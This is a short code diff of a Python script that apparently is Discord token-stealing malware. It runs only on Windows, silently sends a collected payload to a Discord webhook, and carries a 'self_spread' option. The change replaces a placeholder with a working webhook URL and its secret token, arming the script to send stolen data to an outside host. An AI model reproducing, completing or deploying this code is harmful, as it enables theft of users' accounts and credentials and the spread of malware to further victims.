@@ -1,3 +1,4 @@
+
 import os
 if os.name != "nt":
     exit()
@@ -182,7 +183,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1101578626878689390/Q5i3_RGVwTVySCIdsufCahJ9NL4ZWLqtypU0DU4q8plIZiOAHJQRm5oprljHV47eF6Mw", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
